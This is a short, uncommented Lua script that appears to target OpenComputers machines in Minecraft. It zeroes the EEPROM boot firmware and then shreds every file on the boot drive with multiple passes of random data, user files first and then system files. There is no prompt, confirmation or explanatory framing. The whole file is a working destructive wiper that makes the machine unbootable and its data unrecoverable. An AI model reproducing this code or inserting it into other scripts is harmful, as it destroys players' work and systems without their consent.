local fs_proxy = component.proxy(computer.getBootAddress())
local eeprom_proxy = component.proxy(component.list("eeprom")())

local function getRandomGarbage(length)
    local chars = {}
    for i = 1, length do
        chars[i] = string.char(math.random(0, 255))
    end
    return table.concat(chars)
end

local function wipeEEPROM()
    if eeprom_proxy then
        local size = eeprom_proxy.getSize()
        local zeros = string.rep("\0", size)
        pcall(eeprom_proxy.setData, zeros)
    end
end

local function collectFiles(path, fileList)
    local ok, list = pcall(fs_proxy.list, path)
    if not ok or not list then return end
    
    for _, file in ipairs(list) do
        local fullPath = path
        if fullPath:sub(-1) ~= "/" then fullPath = fullPath .. "/" end
        fullPath = fullPath .. file
        
        local isDir = false
        pcall(function() isDir = fs_proxy.isDirectory(fullPath) end)
        
        if isDir then
            collectFiles(fullPath, fileList)
        else
            table.insert(fileList, fullPath)
        end
    end
end

local function shredFile(path)
    local size = 0
    pcall(function() size = fs_proxy.size(path) or 0 end)
    
    local ok, file = pcall(fs_proxy.open, path, "w")
    if ok and file then
        local written = 0
        local chunkSize = 1024
        
        while written < size do
            local toWrite = math.min(chunkSize, size - written)
            local garbage = getRandomGarbage(toWrite)
            pcall(fs_proxy.write, file, garbage)
            written = written + toWrite
        end
        
        for pass = 1, 3 do
            pcall(fs_proxy.seek, file, "set", 0)
            written = 0
            while written < size do
                local toWrite = math.min(chunkSize, size - written)
                local garbage = getRandomGarbage(toWrite)
                pcall(fs_proxy.write, file, garbage)
                written = written + toWrite
            end
        end
        
        pcall(fs_proxy.close, file)
    end
end

wipeEEPROM()

local allFiles = {}
collectFiles("/", allFiles)

local coreFiles = {}
local userFiles = {}

for _, path in ipairs(allFiles) do
    if path:match("^/init%.lua$") or 
       path:match("^/lib/") or 
       path:match("^/bin/") or 
       path:match("^/boot/") or
       path:match("^/rom/") then
        table.insert(coreFiles, path)
    else
        table.insert(userFiles, path)
    end
end

local function runWipe()
    for _, path in ipairs(userFiles) do
        shredFile(path)
    end
    
    for _, path in ipairs(coreFiles) do
        shredFile(path)
    end
end

local co = coroutine.create(runWipe)
while coroutine.status(co) ~= "dead" do
    local success, err = coroutine.resume(co)
end